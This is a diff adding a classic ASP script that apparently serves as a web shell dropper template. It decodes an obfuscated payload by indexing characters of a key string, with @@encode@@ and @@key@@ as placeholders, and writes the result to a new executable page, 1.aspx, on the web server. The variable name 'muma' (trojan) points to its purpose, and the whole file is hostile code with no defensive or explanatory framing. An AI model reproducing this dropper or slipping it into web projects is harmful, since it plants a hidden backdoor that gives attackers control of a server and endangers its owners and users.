@@ -1,0 +1,16 @@
+<%
+dim code,pass,temp1,temp2
+pass = @@encode@@
+muma = split(pass, "|")
+code = @@key@@
+for i = 0 to ubound(muma)
+temp1 = Cint(muma(i))
+temp2 = temp2 & mid(code,temp1,1)
+next
+Set fso=Server.CreateObject("Scripting.FileSystemObject")
+Set f=fso.CreateTextFile(Server.MapPath("1.aspx"),true)
+f.WriteLine temp2
+f.close
+set f=Nothing
+set fso=Nothing
+%>
